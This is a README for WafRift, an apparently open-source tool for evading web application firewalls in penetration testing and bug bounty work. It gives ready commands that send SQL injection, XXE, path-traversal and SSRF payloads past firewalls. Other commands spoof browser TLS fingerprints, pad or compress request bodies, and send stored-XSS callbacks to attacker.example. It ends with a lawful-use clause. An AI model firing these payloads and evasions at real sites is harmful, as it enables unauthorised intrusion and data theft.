# WafRift

[![CI](https://github.com/santhsecurity/wafrift/actions/workflows/ci.yml/badge.svg)](https://github.com/santhsecurity/wafrift/actions/workflows/ci.yml)
[![License: MIT OR Apache-2.0](https://img.shields.io/badge/License-MIT%20OR%20Apache--2.0-blue.svg)](#license)
[![Crates.io](https://img.shields.io/crates/v/wafrift-cli)](https://crates.io/crates/wafrift-cli)

![WafRift Demo](wafrift-demo.gif)

> Part of the [Santh](https://santh.dev) security research ecosystem.

**A programmable WAF-evasion engine.** Encoding × grammar-aware mutation × HTTP smuggling × content-type confusion × TLS fingerprint rotation — every layer addressable, every winning combination cached. Point it at a WAF and an evolutionary loop (hill-climb / SA / tabu / novelty / MAP-Elites) discovers what bypasses that exact stack, then persists the winners to a per-WAF gene bank so the next scan starts with zero discovery.

> **Status: BETA.** Local stacks under [`wafrift-bench/`](./wafrift-bench/) (ModSec PL1–4, Coraza, BunkerWeb, naxsi) are exercised in CI. Cloud-WAF coverage (Cloudflare, AWS WAF, Akamai, Imperva, F5) is still sparse; treat those results as preliminary. PRs welcome — open against [github.com/santhsecurity/wafrift](https://github.com/santhsecurity/wafrift). Full version history in [CHANGELOG.md](CHANGELOG.md).

## What's in the box

- **`wafrift evade`** — offline payload mutator. Pipe a payload in, get N bypass variants out. Every encoding strategy and grammar dialect is addressable as a path (`encoding/url/triple`, `grammar/sql/tautology`) for `--only` / `--exclude`.
- **`wafrift scan`** — fire variants at a live target, classify each response with a multi-signal oracle (block / bypass / challenge / rate-limit), respect server `Retry-After`, surface winning chains. `--session-init <CURL_FILE>` runs an auth-phase request first and replays the resulting cookies on every variant — the **stateful chain mode** real exploits use. `--callback-url URL` substitutes `{{CALLBACK}}` in the payload with a per-variant token to verify blind/stored vulns at a `wafrift listener`. `--payload-class CLASS` warm-starts the per-class gene-bank winners.
- **`wafrift detect`** — fingerprint the WAF / CDN / origin on four independent axes that each survive when the layer above is stripped: HTTP response headers + body (160+ vendor rules), DNS CNAME chain resolution (29 vendor rules), reverse-DNS (PTR) on the leaf IP, and BGP origin-ASN lookup via cymru's DNS service.  Multi-vendor chains surface every layer — nytimes.com gets Envoy + Fastly, eBay's CNAME chain reveals Akamai under their custom proxy banner, Stripe's `Server: nginx` is finally outed as AWS-hosted via the ASN axis.  See [CHANGELOG.md](CHANGELOG.md) for the detection catalog.
- **`wafrift discover`** — parse OpenAPI / GraphQL introspection / parameter-mine a single endpoint into a deduplicated `DiscoveredEndpoint` list with `ParameterLocation` + `InjectionContext` — feed straight into `scan`.
- **`wafrift bypass-probe`** — Tsai-class differential auth/path/method bypass scanner. 230 auth-bypass header probes (incl. gateway-injected-identity headers: Cloudflare Access, GCP IAP, AWS ALB OIDC, Azure Easy Auth, Authentik, oauth2-proxy, Traefik forwardAuth, Grafana — and header-smuggling-via-LWS variants), full path-routing-disagreement family, method overrides. Sorted divergence report with reproduce-it `curl` commands.
- **`wafrift attack`** — end-to-end parser-disagreement orchestrator. One call, every parser-disagreement seam surfaced: URL-path, headers, request body, query-string, cache-key, HTTP/1.1-vs-HTTP/2. Runs the six individual sub-probes (`parser-diff`, `header-diff`, `body-diff`, `query-diff`, `cache-diff`, `h2-diff`) concurrently and merges into one structured report. See `wafrift --help` for the individual sub-commands; [CHANGELOG.md](CHANGELOG.md) describes each probe family.
- **`wafrift distill`** — adversarial distillation via Zeller's ddmin. Take a KNOWN-working bypass payload, find the minimum-edit-distance subset that STILL bypasses. Shorter payloads ship cleaner reports.
- **`wafrift compress`** — wrap a request body in `Content-Encoding: gzip` / `deflate` / `br` (or chain them). Compression-confusion attack: most WAFs inspect raw bytes; brotli especially is widely unsupported in WAF decompressors while every modern origin handles it. Operator pipes a body in, gets compressed bytes + the matching header out.
- **`wafrift listener`** — OOB callback receiver. Pre-mints 128-bit base32 tokens; any inbound HTTP request containing a token is logged. The oracle for blind SQLi (time-based), stored XSS, blind SSRF, OOB cmdi — vuln classes that never echo a verdict on the same response.
- **`wafrift legendary`** — one-shot demo command. Runs detect → fingerprint → bypass-probe (and optionally scan) against a single target, stitches the results into one polished markdown writeup. The fastest way to show what wafrift does.
- **`wafrift-proxy`** — forward HTTP proxy. Chain Burp / Caido / mitmproxy → wafrift-proxy → target; wafrift applies evasion at the upstream forward and records bypasses to its gene bank. MITM mode + TLS impersonation (Chrome / Firefox / Safari ClientHellos, with **header-order coherence** so the wire matches the chosen browser end-to-end) + per-host adaptive rotation + live TUI dashboard.
- **`wafrift replay`** — deterministic re-fire of a known-good bypass against any target. Exits 0 on bypass, 2 on block.

Built so each crate is usable standalone: [`wafrift-encoding`](https://docs.rs/wafrift-encoding), [`wafrift-grammar`](https://docs.rs/wafrift-grammar), [`wafrift-detect`](https://docs.rs/wafrift-detect), [`wafrift-smuggling`](https://docs.rs/wafrift-smuggling), [`wafrift-evolution`](https://docs.rs/wafrift-evolution), [`wafrift-oracle`](https://docs.rs/wafrift-oracle), [`wafrift-strategy`](https://docs.rs/wafrift-strategy). No façade required.

## Install

```bash
# Prebuilt binaries (recommended)
curl -sSfL https://github.com/santhsecurity/wafrift/releases/latest/download/wafrift-$(uname -m)-unknown-linux-gnu.tar.gz | tar xz
sudo mv wafrift wafrift-proxy /usr/local/bin/

# From crates.io
cargo install wafrift-cli
cargo install wafrift-cli   --features tls-impersonate     # optional: enables `wafrift ja3-diff` (BoringSSL — Linux/macOS only)
cargo install wafrift-proxy --features tls-impersonate     # optional: BoringSSL impersonation  (Linux/macOS only)
```

**Note**: The `tls-impersonate` feature compiles BoringSSL via cmake.
On Windows you'll need a working cmake + MSVC build toolchain (the
Microsoft C++ Build Tools); `wafrift ja3-diff` and the proxy's
`--tls-impersonate` flag are unavailable on Windows hosts that lack
those build prerequisites. Every other wafrift surface (scan, detect,
attack, parser-diff family, bench-waf, smuggle, listener, ...) works
on Windows out of the box.

macOS: `wafrift-aarch64-apple-darwin.tar.gz`. Windows: `.zip` of the same name. Full asset list under [Releases](https://github.com/santhsecurity/wafrift/releases). From source: `cargo install --path crates/cli`.

## Quickstart

Pick your workflow: each is copy-paste ready.

### 🏁 CTF: "I have a SQLi but there's a WAF"

```bash
# Get bypass variants instantly (offline, no target needed)
wafrift evade --payload "' OR 1=1--" --level heavy

# Found a WAF? Fire all variants and see what gets through
wafrift scan --target http://ctf.example/vuln --payload "' OR 1=1--"
```

### 🔍 Pentest: "sqlmap/ffuf behind a WAF"

```bash
# Start the evasion proxy
cargo run -p wafrift-proxy -- --listen 127.0.0.1:8080

# Route your tools through it
sqlmap -u "https://target/x?id=1" --proxy="http://127.0.0.1:8080"
ffuf -x http://127.0.0.1:8080 -u https://target/FUZZ -w wordlist.txt

# Check live findings mid-session
curl http://127.0.0.1:8080/_wafrift/findings.md
```

### 🎯 Bug Bounty: "Scan this target, give me a report"

```bash
# Full autonomous scan with JSON output
wafrift scan --target https://target.com --payload "' UNION SELECT 1--" \
  --param id --format json --output results.json

# Generate a markdown writeup from findings
wafrift report --only-host target.com --output writeup.md
```

### 🗺️ Discovery: "I have an OpenAPI spec / GraphQL endpoint, find injection points"

```bash
# Parse an OpenAPI 2.0/3.x JSON spec into structured injection points
wafrift discover --spec api.json --format json --output endpoints.json

# Probe a GraphQL server's introspection schema
wafrift discover --target https://api.example.com/graphql --introspect

# Differential parameter mining against a single endpoint
wafrift discover --target https://app.example.com/search \
  --mine-params --wordlist /path/to/burp-parameter-names.txt

# Combine modes; results are deduplicated by (method, url) and emit
# `DiscoveredEndpoint` JSON suitable for piping into `wafrift scan`.
wafrift discover --spec api.json --target https://app.example.com \
  --introspect --mine-params --wordlist params.txt --format json
```

Each injection point carries its `ParameterLocation` (Query / Path /
Header / Cookie / Body), `InjectionContext` (`JsonString` /
`UrlQuery` / `XmlText` / `MultipartField` / etc.) inferred from the
spec's media type, and a `required` flag: letting `wafrift scan`
pick context-aware encodings instead of guessing.

### 🛡️ Stealth: "Cloudflare/Akamai blocks me on JA3 before I can even probe"

```bash
# One-time: build with the BoringSSL impersonation feature.
cargo install wafrift-proxy --features tls-impersonate

# Run the proxy wearing a real Chrome 131 ClientHello on every
# upstream forward. JA3 / JA4 / h2 SETTINGS all match a real browser
# bytes-for-bytes: edge WAFs that classify on TLS fingerprint
# (Cloudflare bot management, Akamai, Sigsci, Imperva Bot Protection)
# see "browser" instead of "rustls" and let the connection through to
# inspection, where wafrift's HTTP-level evasion takes over.
wafrift-proxy --listen 127.0.0.1:8080 --tls-impersonate chrome131

# Profiles: chrome131, chrome120, edge131, firefox133, safari18,
# safari17_5, okhttp5; aliases `chrome`, `firefox`, `safari`, `edge`
# resolve to the latest-of-family. See docs/TLS_PARITY.md.

# Now sqlmap / ffuf / curl through this proxy gets through edge TLS
# fingerprinting without any extra config.
sqlmap -u "https://target.cloudflare-protected.com/x?id=1" --proxy=http://127.0.0.1:8080
```

#### Per-request fingerprint rotation + body padding

Cloud WAFs inspect only the leading bytes of a request body
(Cloudflare Pro 8 KB, AWS WAF 16 KB, Akamai 8 KB): pad past that
window and the rule engine never sees the malicious bytes. Combine
with TLS profile rotation and a fresh TCP source port per request:

```bash
wafrift-proxy --listen 127.0.0.1:8080 \
    --tls-impersonate-rotate chrome131,firefox133,safari18 \
    --body-padding-bytes 16384 \
    --no-conn-reuse \
    --tui
```

- `--tls-impersonate-rotate` round-robins across the listed browser
  profiles. Defeats per-fingerprint rate limits and reputation.
- `--body-padding-bytes 16384` prepends 16 KB of inert filler to every
  JSON / form-urlencoded / multipart body via the new
  `_wafrift_pad` field/part. Cloud WAFs miss the payload; the origin
  parses it correctly.
- `--no-conn-reuse` opens a fresh TCP connection per upstream forward
  (kernel picks a new ephemeral source port each time).
- `--tui` opens a real-time terminal dashboard (per-host bypass rate,
  TLS rotation distribution, padded-body counter, live request stream).
  Press `q` for graceful shutdown, `r` to reset counters.

### 🔴 Red Team: "Persistent evasion against the same WAF"

```bash
# First scan learns what bypasses the WAF in front of target.com
# (wafrift detects the WAF automatically and tags genome by name)
wafrift scan --target https://target.com --payload "' OR 1=1--"

# Subsequent scans against any target behind the same WAF start in
# rotation mode (zero discovery). Genome at ~/.wafrift/genomes/<waf>.json
# persists across sessions.
wafrift scan --target https://other-target-same-waf.com --payload "' OR 1=1--"

# Replay a finding deterministically (exits 0 on bypass, 2 on block).
# --from-waf reads the genome wafrift's detect step identified earlier
# (e.g. "ModSecurity"); --from-host pulls from the proxy gene-bank.
wafrift replay --target https://target.com --param id \
    --payload "' OR 1=1--" --from-waf ModSecurity
```

> Genomes only exist for WAFs you've previously scanned. Out-of-the-box
> there are no pre-shipped vendor genomes; first scan against any new
> WAF goes through full discovery.

### 🔐 Authenticated app: "scan an admin panel that needs a login first"

The two-phase real-attack pattern. Paste the login request from Burp's
"Copy as cURL" into a file, hand it to `--session-init`, and every
subsequent variant request carries the captured cookies + Authorization:

```bash
# 1. Capture the login curl from Burp / Chromium devtools.
xclip -o > /tmp/login.curl

# 2. Scan the protected endpoint with the established session.
wafrift scan --target https://target.com/admin/users \
    --payload "' OR 1=1--" --param id \
    --session-init /tmp/login.curl
```

Defeats WAFs that scrutinise unauthenticated traffic more (most do).
Re-uses `import-curl`'s curl parser — same syntax you'd hand `wafrift
import-curl --evade`. Cookies are captured from every `Set-Cookie`
the login chain produces (including redirects) AND any `Cookie:` /
`Authorization:` you set in the curl itself. The most-recent cookie
wins on name collision (browser semantics).

### 👁️ Blind / stored vulns: "the payload lands but the response says nothing"

For blind SQLi (time-based), stored XSS, blind SSRF, and OOB command
injection — the response that triggers the vuln NEVER carries the
verdict. Start a `wafrift listener` on infrastructure you control,
embed `{{CALLBACK}}` in the payload, and `wafrift scan` substitutes a
per-variant token. Any inbound hit at the listener with a matching
token = verified bypass.

```bash
# Terminal A: stand up the listener (loopback by default; bind
# 0.0.0.0:9000 for external targets you control).
wafrift listener --bind 0.0.0.0:9000

# Terminal B: scan with the callback substitution.
wafrift scan --target https://target.com/comments \
    --payload '<img src="{{CALLBACK}}/x.png">' --param body \
    --callback-url http://attacker.example:9000
```

Terminal A logs each callback with the matched token; cross-reference
with the per-variant tokens printed by `wafrift scan` to identify
which variant landed.

### 🛠️ Compression-confusion bodies: "the WAF inspects bytes; the origin decompresses"

```bash
# Pipe a payload through gzip + brotli — outermost first per RFC 9110 §8.4.
echo -n "' UNION SELECT username,password FROM users--" \
    | wafrift compress --algo gzip --algo br > /tmp/body.bin
# stderr: Content-Encoding: gzip, br

# Fire with curl: the body bytes are compressed-then-compressed; the
# WAF sees binary noise, the origin (nginx + brotli module) decodes
# both layers and processes the SQLi normally.
curl -X POST https://target.com/api/users \
    -H 'Content-Type: application/json' \
    -H 'Content-Encoding: gzip, br' \
    --data-binary @/tmp/body.bin
```

Brotli is the headline gap: many WAFs ship gzip/deflate decompressors
but no brotli decoder, while origins (Chrome 49+ / nginx 1.11+ /
Apache mod_brotli) all handle it. `wafrift compress --algo br` is
often enough on its own.

### 🔬 Parser disagreements: "find the seam between WAF and origin URL parsers"

```bash
# Fire 16 URL-shape variants (semicolon-strip, backslash-as-separator,
# NUL truncation, double-URL-decode, fullwidth slash, dot-segment,
# percent case, empty-segment collapse, trailing dot) against the
# protected path. A divergence vs the baseline = the WAF and origin
# disagree on what /admin means.
wafrift parser-diff https://target.com/admin --format json > /tmp/diff.json
```

`wafrift bypass-probe` covers the auth-header / method-override
side; `parser-diff` covers the URL-shape side. They compose.

### 📰 One-shot writeup: "what does wafrift see end-to-end?"

```bash
# detect -> fingerprint -> bypass-probe -> (scan) -> polished markdown.
wafrift legendary https://target.com --output report.md
# For the deeper sweep: pass --payload to enable the live-scan phase.
wafrift legendary https://target.com --payload "' OR 1=1--" --param id \
    --output report.md
```

The fastest way to show a stakeholder what wafrift does in one command.

### Five common shapes

**1. SQL-injection login bypass.** WAF blocks `' OR 1=1--`; find a variant that lands.

```bash
wafrift scan --target https://target/login \
  --payload "' OR 1=1--" --param username --level heavy
```

**2. SSTI in a server-side template.** Variant of `{{7*7}}` that the WAF allows but the engine still evaluates.

```bash
wafrift scan --target https://target/profile \
  --payload "{{7*7}}" --param name --level heavy --only grammar/ssti,encoding
```

**3. SSRF to internal admin.** Smuggle a `127.0.0.1:9000` request past a WAF that only blacklists string `127.0.0.1`.

```bash
wafrift scan --target https://target/preview \
  --payload "http://127.0.0.1:9000/admin" --param url --level heavy \
  --only encoding,grammar/ssrf
```

**4. Path traversal / LFI.** WAF blocks `../`; find a variant that survives.

```bash
wafrift scan --target https://target/static \
  --payload "../../../etc/passwd" --param file --level heavy \
  --only encoding/url,encoding/unicode,grammar/path
```

**5. XXE in an XML body.** Practitioner has the request body in a file; want to scan with that exact body shape.

```bash
# Copy the request as cURL out of Burp/ZAP, paste through import-curl:
pbpaste | wafrift import-curl --from-stdin \
  --param xmlData --payload '<!DOCTYPE foo [<!ENTITY x SYSTEM "file:///etc/passwd">]><foo>&x;</foo>' \
  --level heavy
```

**Saving and replaying findings.** Once a recipe lands a bypass, persist it to the gene-bank so subsequent runs (or teammates) don't re-do discovery:

```bash
wafrift seed --waf modsec-crs --technique EncodingDoubleUrl,GrammarTautology
wafrift bank export --output bundle.json    # share with teammate
wafrift bank import bundle.json             # on teammate's machine
```

Replay any saved finding deterministically:

```bash
wafrift replay --target https://target/login --param username \
  --payload "' OR 1=1--" --from-host target  # exits 0 on bypass, 2 on block
```

## Operator reference

### Live MITM dashboard (`wafrift-proxy --tui`)

Three tabs. Switch with `Tab` or `1`/`2`/`3` (or `f`/`o`/`h`).

- **Flow** — bounded ring of 500 requests with status-graded coloring (2xx green, 3xx cyan, 4xx yellow, 5xx red; outcome BYPASS green, BLOCK red, PASS white). `j`/`k` navigate, `g`/`G` jump first / last, `Enter` toggles a side detail pane (full request + response + technique chain). Two sparklines below: req/s and bypasses/s over 60 s.
- **Overview** — counters, TLS rotation gauge, WAFs identified.
- **Hosts** — per-host bypass table sortable by sent count, with bypass-rate color grading and the identified WAF column.
- `q` / `Esc` — graceful quit (flushes the gene bank).

### Fine-grained technique selection

Every encoding strategy and the grammar layer is addressable as a hierarchical path:

```bash
wafrift techniques list                                                # see the tree
wafrift evade --payload "' OR 1=1--" --only encoding/url
wafrift scan --target http://target.com --payload "' OR 1=1--" \
    --exclude encoding/url/triple,encoding/sql/comment
```

Unknown selectors fail fast — no silent drops.

### Differential bypass probing (`wafrift bypass-probe`)

For Tsai-class boundary-mismatch vulns (admin panel gated by WAF header rule, `X-Original-URL` rewrite, ProxyShell-style routing disagreement, IP-trust spoofing), point bypass-probe at the resource and let it fire the full 136-probe auth-bypass set plus path/method variants:

```bash
# Single URL
wafrift bypass-probe https://target/admin --concurrency 16

# Whole admin surface from a list
cat > paths.txt <<EOF
/admin
/api/admin
/.env
/actuator/env
/wp-admin
EOF
wafrift bypass-probe https://target --paths-file paths.txt \
    --concurrency 16 --min-severity medium --format json > findings.json
```

Honours server `Retry-After` via a shared deadline (jittered ±20%), surfaces `retry_after_responses` + `max_retry_after_obeyed_ms` in the report. Each divergence (status flip, body delta) is reported with a reproduce-it `curl` one-liner.

### Burp / Caido / mitmproxy chaining

WafRift is a forward HTTP proxy and slots in next to any other intercepting proxy. Conventional layout:

```
Browser → Burp (8080) → wafrift-proxy (8181) → Target
                ▲                  ▲
                │                  └── applies WAF evasion (encoding,
                │                      CT switching, padding, fingerprint
                │                      rotation, MCTS) before forwarding
                │
                └── operator inspects/edits requests in Burp's UI as usual
```

Run wafrift-proxy on a different port and tell Burp to use it as the "Upstream Proxy Server" for the target host:

```bash
wafrift-proxy --listen 127.0.0.1:8181 \
  --content-type-switching \
  --max-rps-per-host 5 \
  --tls-impersonate-rotate chrome131,firefox133
```

In Burp: `User options → Connections → Upstream Proxy Servers → Add → Destination host: target.example.com, Proxy host: 127.0.0.1, Proxy port: 8181`. Caido: `Settings → Proxies → Upstreams`. mitmproxy: `mitmdump --mode upstream:http://127.0.0.1:8181`.

To replay a captured Burp request directly through wafrift's evasion pipeline (no proxy chain needed):

```bash
# Burp → right-click request → Copy as cURL → save to /tmp/req.curl
xclip -o > /tmp/req.curl

# Run wafrift's evasion engine against the captured request. Evasion
# is implicit when --payload is given; --format json emits NDJSON
# variant lines for piping into jq / a downstream scanner.
wafrift import-curl --curl-file /tmp/req.curl \
  --param id --payload "' OR 1=1--" \
  --level heavy --format json > /tmp/scan.json
```

CLI output is line-delimited JSON when `--quiet` is set, so it pipes cleanly into `jq`, `head`, `grep -m 1`, etc. (`SIGPIPE` is handled silently — no broken-pipe panics on `wafrift evade ... | head`.)

### Proxy scope, rate limit, live findings

```bash
# Only evade *.example.com on JSON API endpoints; skip login + static.
wafrift-proxy --listen 127.0.0.1:8080 --mitm \
  --only-host '*.example.com' \
  --skip-path '/static/*,/oauth/*,/login,/favicon.ico' \
  --only-method 'POST,PUT,PATCH,DELETE'

# Token bucket: 5 req/s per upstream host, burst of 10.
wafrift-proxy --listen 127.0.0.1:8080 --mitm \
  --max-rps-per-host 5 --max-rps-per-host-burst 10

# Live findings, loopback-only:
curl http://127.0.0.1:8080/_wafrift/findings.md   # markdown writeup
curl http://127.0.0.1:8080/_wafrift/status        # JSON (per-host stats)
```

Globs use a tiny ASCII grammar (`*` matches any run, `?` matches one byte, case-insensitive). `--skip-host`/`--skip-path` evaluate after their `--only-*` counterparts.

### Authorisation

`wafrift-proxy` refuses upstream targets in private / loopback / RFC1918 / link-local ranges by default; pass `--allow-private-upstream` only against lab targets you own. `wafrift replay` and `bypass-probe` send genuinely exploitable strings — see the [Lawful Use](#lawful-use--repository-responsibility) clause at the bottom of this README.

## Measured bypass rates

Live scoreboard: [`docs/SCOREBOARD.md`](./docs/SCOREBOARD.md) — refreshed nightly from CI; per-(WAF × payload-class) verified-bypass rate across ModSec PL1-4, Coraza, BunkerWeb, and naxsi. Every number below is reproducible from [`wafrift-bench/`](./wafrift-bench/); methodology in [`wafrift-bench/methodology.md`](./wafrift-bench/methodology.md); machine-readable JSON in `wafrift-bench/results/`.

**Target: ModSecurity + OWASP CRS.** Corpus: 557 cases across 10 attack classes (sql / xss / cmdi / ssti / path / ldap / xxe / ssrf / nosql / log4shell). 10 evasion strategies combined; oracle-gated (each "bypass" verified structurally as a valid attack, not garbage that slipped past).

| Paranoia | Variants sent | Bypassed | Rate | Cases ≥1 bypass |
|---|---:|---:|---:|---:|
| **PL=1** (default) | 46k | 16.7k | **36%** | **557 / 557 (100%)** |
| PL=2 | 60k | 17.6k | 29% | 557 / 557 (100%) |
| PL=3 | 60k | 17.3k | 28% | 557 / 557 (100%) |
| **PL=4** (most aggressive) | 60k | 16.3k | **27%** | **557 / 557 (100%)** |

**At every paranoia level — including PL=4, CRS's most paranoid preset — every single attack case in the corpus has at least one working bypass when the full strategy stack is applied with 60+ variants per case.** Once a working seed exists, the per-host gene bank (`~/.wafrift/genomes/`) replays it indefinitely.

> "557/557 cases bypassed" is a search-budget result, not a one-shot rate. The proxy alone (HTTP-layer evasion only) still gets blocked on a naked SQLi against PL=4; payload-byte mutation lives in `wafrift scan` / `wafrift bench-waf`. Worked example: [`docs/PRACTITIONER_WALKTHROUGH.md`](./docs/PRACTITIONER_WALKTHROUGH.md).

```bash
# Reproduce
git clone https://github.com/santhsecurity/wafrift && cd wafrift
wafrift-bench/scripts/up.sh modsec-pl4
cargo run --release -p wafrift-cli -- bench-waf \
    --base-url http://127.0.0.1:18084 \
    --corpus wafrift-bench/corpus \
    --evade --variants 20 \
    --strategies heavy,mcts,smuggling,content-type,redos,hill-climb,sim-anneal,tabu,novelty,map-elites,differential \
    --oracle-gate \
    --output repro.json
jq .evaded_summary repro.json
```

## How it compares

| Tool | Encoding | Grammar mutation | Smuggling | CT swap | Per-host learning | Forward proxy | Replay |
|---|:-:|:-:|:-:|:-:|:-:|:-:|:-:|
| sqlmap `--tamper` | partial | SQL only | – | – | – | via `--proxy` | – |
| Burp `nowafpls` | – | – | – | – | – | Burp ext. | – |
| Burp "Bypass WAF" | header tricks | – | – | – | – | Burp ext. | – |
| HTTP Request Smuggler | – | – | yes | – | – | Burp ext. | – |
| **WafRift** | **15+ strategies** | **SQL/XSS/CMD/SSTI/path/LDAP/SSRF** | **CL.TE / TE.CL / TE.TE** | **multipart/json/xml** | **gene-bank** | **standalone + MITM** | **deterministic** |

WafRift is the evasion layer you add when sqlmap / Burp / ffuf are blocked by a WAF — not a replacement. Once a working seed exists, the per-host gene bank replays it indefinitely: a Cloudflare scan starts with proven bypasses on every subsequent run, **zero discovery phase**. Grammar mutations are validated against `sqlparser-rs` AST equivalence, so SQL variants actually parse — most tampers ship broken payloads and don't know it.

## Architecture

```
wafrift
├── crates/
│   ├── types          # Core types: Request, Technique, EvasionResult
│   ├── encoding       # 15+ encoding strategies (URL, Unicode, HTML entity, chunked, …)
│   ├── grammar        # Grammar-aware mutations (SQLi, XSS, CMD, SSTI, SSRF, LDAPi, path)
│   ├── content-type   # JSON / XML / multipart switching
│   ├── smuggling      # CL.TE / TE.CL / H2 desync
│   ├── fingerprint    # UA / TLS / header-order rotation
│   ├── detect         # WAF fingerprinting (160+ WAFs via TOML rules)
│   ├── evolution      # GA + MCTS + differential probing
│   ├── oracle         # Multi-signal verdict classification
│   ├── strategy       # Pipeline + gene bank + adaptive host state
│   ├── transport      # Evasion-aware HTTP client with auto-retry
│   ├── proxy          # Forward proxy with per-host adaptive evasion
│   ├── pool           # Proxy pool rotation (HTTP/SOCKS5)
│   ├── recon          # Origin discovery via OSINT (CT logs, DNS history)
│   └── cli            # CLI + TUI (scan / evade / detect / probe / report / replay)
```

The proxy continuously learns: **discover → rotate (winners) → drift-detect → re-discover**. After ≥60% winners are found it stops rolling dice and round-robins the known-good chain; if a winner gets blocked 2× consecutively it's evicted; when all winners are evicted, full discovery restarts. Per-WAF state is persisted to `~/.wafrift/genomes/<waf>.json`:

```json
{
  "waf_name": "Cloudflare",
  "techniques": [
    {"name": "encoding::UnicodeEncode", "total_successes": 13, "total_attempts": 13},
    {"name": "tautology_swap",         "total_successes": 56, "total_attempts": 56}
  ],
  "targets_scanned": 3
}
```

## Library use

```toml
[dependencies]
wafrift-core = "0.2"
tokio = { version = "1", features = ["rt-multi-thread", "macros"] }
```

```rust
use wafrift_core::encoding::{self, Strategy};

let encoded = encoding::encode(b"' OR 1=1--", Strategy::UnicodeEncode)?;
```

Or pull individual crates — every public API has a runnable doctest on [docs.rs](https://docs.rs/wafrift-encoding):

```toml
wafrift-encoding  = "0.2"   # 15+ encoding strategies
wafrift-grammar   = "0.2"   # SQL/XSS/CMD/SSTI dialect mutations
wafrift-detect    = "0.2"   # WAF fingerprinting
wafrift-smuggling = "0.2"   # CL.TE / TE.CL / H2 desync
wafrift-evolution = "0.2"   # GA / novelty / MAP-Elites bypass search
wafrift-oracle    = "0.2"   # Response verdict classification
wafrift-strategy  = "0.2"   # Per-WAF evasion pipeline planning
```

The CLI's `scan` flow is `wafrift-strategy + wafrift-transport + wafrift-detect` — embed those directly if you need the same pipeline without the binary.

## Custom WAF detection

WAF signatures, evasion pipelines, and smuggling probes are TOML data in `rules/`. The 160+ vendor catalog is derived from [wafw00f](https://github.com/EnableSecurity/wafw00f) (BSD-3-Clause) + selective additions from [identYwaf](https://github.com/stamparm/identYwaf) (MIT) + locally researched entries; every TOML rule carries a `source` field pointing back at its origin. Adding a new WAF is five lines of TOML, no Rust knowledge:

```toml
# rules/detect/mywaf.toml
name = "MyWAF"
vendor = "Example Corp"
confidence_weight = 0.9

[[headers]]
name = "Server"
pattern = "MyWAF/\\d+"

[[body_patterns]]
pattern = "(?i)blocked by MyWAF"

evasions = ["encoding::unicode", "grammar::tautology_swap"]
```

Drop into `rules/detect/` and the detector loads it at startup.

## Roadmap

[docs/GAP_CLOSURE_ROADMAP.md](docs/GAP_CLOSURE_ROADMAP.md) tracks the phased work toward cloud-WAF parity (HTTP/2 + JA3 fingerprint, origin recon, scoreboard). Supporting docs: [docs/TLS_PARITY.md](docs/TLS_PARITY.md), [docs/PROXY_TOOLING.md](docs/PROXY_TOOLING.md), [docs/PRACTITIONER_WALKTHROUGH.md](docs/PRACTITIONER_WALKTHROUGH.md).

## License

Licensed under either of

- Apache License, Version 2.0 ([LICENSE-APACHE](LICENSE-APACHE) or <http://www.apache.org/licenses/LICENSE-2.0>)
- MIT license ([LICENSE-MIT](LICENSE-MIT) or <https://opensource.org/licenses/MIT>)

at your option.

### Contribution

Unless you explicitly state otherwise, any contribution intentionally submitted for inclusion in the work by you, as defined in the Apache-2.0 license, shall be dual licensed as above, without any additional terms or conditions.

## Lawful Use & Repository Responsibility

wafrift is dual-use security research software. It implements WAF
evasion techniques that, executed against systems you do not own or
have written authorisation to test, may violate computer-misuse law
(CFAA in the United States, Computer Misuse Act in the United Kingdom,
StGB §202c in Germany, equivalent statutes elsewhere). By downloading,
building, or running wafrift you agree:

1. **Authorisation is yours alone.** You will only run wafrift against
   systems you own, operate, or have explicit written authorisation to
   test: bug-bounty scope, signed pentest agreement, CTF rules, or
   lab infrastructure under your control. Verify scope before each
   engagement.
2. **Legal responsibility transfers to the operator.** The Santh
   Security maintainers, contributors, and the project itself accept
   no liability for traffic generated by, damages caused by, or legal
   exposure resulting from your use of the tool.
3. **Unauthorised use is out of scope of any support.** We will not
   help users bypass WAFs protecting systems they have no authorisation
   to interact with. Reports of misuse may be forwarded to the affected
   organisation's `abuse@` / legal channels.

Full clause and reporting workflow in [`SECURITY.md`](./SECURITY.md#lawful-use--repository-responsibility) and [`CODE_OF_CONDUCT.md`](./CODE_OF_CONDUCT.md#lawful-use--repository-responsibility).
